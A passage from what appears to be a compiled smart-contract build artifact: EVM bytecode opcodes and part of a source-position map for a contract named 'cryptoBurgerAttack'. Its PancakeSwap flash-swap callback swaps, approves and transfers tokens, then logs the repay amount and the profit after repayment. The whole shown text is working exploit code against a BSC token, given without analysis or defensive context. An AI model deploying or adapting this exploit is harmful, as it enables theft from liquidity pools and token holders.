PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP SWAP1 DUP9 AND SWAP1 PUSH4 0xA9059CBB SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x24EC JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2510 SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE PUSH1 0xC DUP2 DUP4 ADD MSTORE PUSH12 0x14995C185E48185B5BDD5B9D PUSH1 0xA2 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG1 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x25AA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x25CE SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x260C SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x14 SWAP1 DUP3 ADD MSTORE PUSH20 0x283937B334BA1030B33A32B9103932B830BC9D1 PUSH1 0x65 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x18160DDD PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 MLOAD PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x18160DDD SWAP2 PUSH1 0x4 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x266B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x268F SWAP2 SWAP1 PUSH2 0x2DCC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x26CB SWAP2 SWAP1 PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x12 SWAP1 DUP3 ADD MSTORE PUSH18 0x2A37BA30B610212AA9239039BAB838363C9 PUSH1 0x75 SHL PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xE6A43905 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH20 0x8AC76A51CC950D9822D68B83FE1AD97B32CD580D PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x0 SWAP1 PUSH20 0xCA143CE32FE78F1F7019D7D551A6402FC5350C73 SWAP1 PUSH4 0xE6A43905 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2759 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x277D SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x27CC JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x5061697220646F65736E27742065786973747321 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x21C JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDFE1681 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x280C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2830 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2872 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2896 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x28BA JUMPI PUSH1 0x0 PUSH2 0x28BC JUMP JUMPDEST DUP5 JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP8 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x28E0 JUMPI PUSH1 0x0 PUSH2 0x28E2 JUMP JUMPDEST DUP6 JUMPDEST SWAP1 POP DUP5 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x22C0D9F DUP4 DUP4 ADDRESS DUP12 DUP12 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x291D SWAP3 SWAP2 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND DUP3 MSTORE PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x40 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x294B SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x2ECE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2965 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2979 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH20 0x2B0551B656509754285EEC81EE894338E14C5DD PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x29E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2A0B SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2A67 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x2A8B SWAP2 SWAP1 PUSH2 0x2EAC JUMP JUMPDEST POP PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP1 DUP4 ADD DUP5 MSTORE SWAP3 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP DUP6 DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x2AC0 JUMPI PUSH2 0x2AC0 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE POP POP DUP5 DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x2AF4 JUMPI PUSH2 0x2AF4 PUSH2 0x2C93 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x20 SWAP3 DUP4 MUL SWAP2 SWAP1 SWAP2 ADD SWAP1 SWAP2 ADD MSTORE PUSH1 0x40 MLOAD PUSH4 0x5C11D795 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FBE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH4 0x5C11D795 SWAP1 PUSH2 0x2B45 SWAP1 DUP8 SWAP1 DUP8 SWAP1 DUP7 SWAP1 DUP9 SWAP1 TIMESTAMP SWAP1 PUSH1 0x4 ADD PUSH2 0x2F41 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2B5F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2B73 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x2B94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x80 DUP7 DUP9 SUB SLT ISZERO PUSH2 0x2BAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP6 CALLDATALOAD PUSH2 0x2BBA DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP5 POP PUSH1 0x20 DUP7 ADD CALLDATALOAD SWAP4 POP PUSH1 0x40 DUP7 ADD CALLDATALOAD SWAP3 POP PUSH1 0x60 DUP7 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x2BE5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP9 ADD SWAP2 POP DUP9 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x2BF9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD DUP2 DUP2 GT ISZERO PUSH2 0x2C08 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP10 PUSH1 0x20 DUP3 DUP6 ADD ADD GT ISZERO PUSH2 0x2C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP7 SWAP10 SWAP6 SWAP9 POP SWAP4 SWAP7 POP PUSH1 0x20 ADD SWAP5 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2C40 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 CALLDATALOAD PUSH2 0x2C4B DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2C6B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH2 0x2C76 DUP2 PUSH2 0x2B7F JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 MLOAD DUP1 DUP5 MSTORE PUSH1 0x20 DUP1 DUP6 ADD SWAP5 POP DUP1 DUP5 ADD PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2CE2 JUMPI DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP8 MSTORE SWAP6 DUP3 ADD SWAP6 SWAP1 DUP3 ADD SWAP1 PUSH1 0x1 ADD PUSH2 0x2CBD JUMP JUMPDEST POP SWAP5 SWAP6 SWAP5 POP POP POP POP POP JUMP JUMPDEST DUP3 DUP2 MSTORE PUSH1 0x40 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0x2D06 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x2CA9 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x2D21 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x2D39 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP6 ADD SWAP2 POP DUP6 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x2D4D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP2 DUP2 GT ISZERO PUSH2 0x2D5F JUMPI PUSH2 0x2D5F PUSH2 0x2C7D JUMP JUMPDEST DUP1 PUSH1 0x5 SHL PUSH1 0x40 MLOAD PUSH1 0x1F NOT PUSH1 0x3F DUP4 ADD AND DUP2 ADD DUP2 DUP2 LT DUP6 DUP3 GT OR ISZERO PUSH2 0x2D84 JUMPI PUSH2 0x2D84 PUSH2 0x2C7D JUMP JUMPDEST PUSH1 0x40 MSTORE SWAP2 DUP3 MSTORE DUP5 DUP3 ADD SWAP3 POP DUP4 DUP2 ADD DUP6 ADD SWAP2 DUP9 DUP4 GT ISZERO PUSH2 0x2DA2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 DUP6 ADD SWAP4 JUMPDEST DUP3 DUP6 LT ISZERO PUSH2 0x2DC0 JUMPI DUP5 MLOAD DUP5 MSTORE SWAP4 DUP6 ADD SWAP4 SWAP3 DUP6 ADD SWAP3 PUSH2 0x2DA7 JUMP JUMPDEST SWAP9 SWAP8 POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2DDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x40 DUP1 DUP3 MSTORE PUSH1 0x18 SWAP1 DUP3 ADD MSTORE PUSH32 0x57424E422062616C616E6365206F6620636F6E74726163740000000000000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x2E4C JUMPI PUSH2 0x2E4C PUSH2 0x2E24 JUMP JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0x2E6D JUMPI PUSH2 0x2E6D PUSH2 0x2E24 JUMP JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x2E8F JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH2 0x2EA7 JUMPI PUSH2 0x2EA7 PUSH2 0x2E24 JUMP JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EBE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x2C76 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP5 DUP2 MSTORE PUSH1 0x0 PUSH1 0x20 DUP6 DUP2 DUP5 ADD MSTORE PUSH1 0x1 DUP1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x40 DUP5 ADD MSTORE PUSH1 0x80 PUSH1 0x60 DUP5 ADD MSTORE DUP4 MLOAD DUP1 PUSH1 0x80 DUP6 ADD MSTORE PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2F16 JUMPI DUP6 DUP2 ADD DUP4 ADD MLOAD DUP6 DUP3 ADD PUSH1 0xA0 ADD MSTORE DUP3 ADD PUSH2 0x2EFA JUMP JUMPDEST DUP2 DUP2 GT ISZERO PUSH2 0x2F28 JUMPI PUSH1 0x0 PUSH1 0xA0 DUP4 DUP8 ADD ADD MSTORE JUMPDEST POP PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP3 SWAP1 SWAP3 ADD PUSH1 0xA0 ADD SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST DUP6 DUP2 MSTORE DUP5 PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0xA0 PUSH1 0x40 DUP3 ADD MSTORE PUSH1 0x0 PUSH2 0x2F60 PUSH1 0xA0 DUP4 ADD DUP7 PUSH2 0x2CA9 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 SWAP1 SWAP5 AND PUSH1 0x60 DUP4 ADD MSTORE POP PUSH1 0x80 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP INVALID STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP STOP DELEGATECALL 0xD CALLER 0xDE PUSH8 0x37367A1CCB0CE6A0 JUMP PUSH10 0x8D993A17E10000000000 STOP STOP STOP STOP STOP STOP STOP 0xBB 0x4C 0xDB SWAP13 0xBD CALLDATASIZE 0xB0 SHL 0xD1 0xCB 0xAE 0xBF 0x2D 0xE0 DUP14 SWAP2 PUSH20 0xBC095C00000000000000000000000010ED43C718 PUSH18 0x4EB63D5AA57B78B54704E256024E54686520 PUSH19 0x657175697265642057424E4220616D6F756E74 KECCAK256 PUSH7 0x6F722031394D50 EXP 0x5C 0x23 0xC9 STOP 0xBD 0xDE SGT MSTORE 0xBB MULMOD RETURNDATASIZE SIGNEXTEND PUSH5 0x80339DC331 PUSH29 0x387F4A23FF9AECC606FF45A2646970667358221220E13B67340FB96DCB 0xB1 0xAB EXTCODEHASH 0xC9 PUSH12 0xDAE0EFF6AD2686696E44C927 KECCAK256 0x5C PUSH8 0x3A92985764736F6C PUSH4 0x4300080D STOP CALLER ",
  "pcMap": {
    "0": {
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "8": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "LT",
      "path": "0"
    },
    "9": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D"
    },
    "12": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "13": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "15": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "CALLDATALOAD",
      "path": "0"
    },
    "16": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "18": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "SHR",
      "path": "0"
    },
    "19": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "DUP1",
      "path": "0"
    },
    "20": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x84800812"
    },
    "25": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "EQ",
      "path": "0"
    },
    "26": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x39"
    },
    "29": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "30": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "DUP1",
      "path": "0"
    },
    "31": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x9D9E465C"
    },
    "36": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "EQ",
      "path": "0"
    },
    "37": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5B"
    },
    "40": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "41": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "43": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "DUP1",
      "path": "0"
    },
    "44": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "REVERT",
      "path": "0"
    },
    "45": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "46": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "47": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x34"
    },
    "50": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "51": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "STOP",
      "path": "0"
    },
    "52": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "53": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "55": {
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "DUP1",
      "path": "0"
    },
    "56": {
      "first_revert": true,
      "fn": null,
      "offset": [
        419,
        12856
      ],
      "op": "REVERT",
      "path": "0"
    },
    "57": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "58": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "59": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "DUP1",
      "path": "0"
    },
    "60": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        1927,
        12096
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "61": {
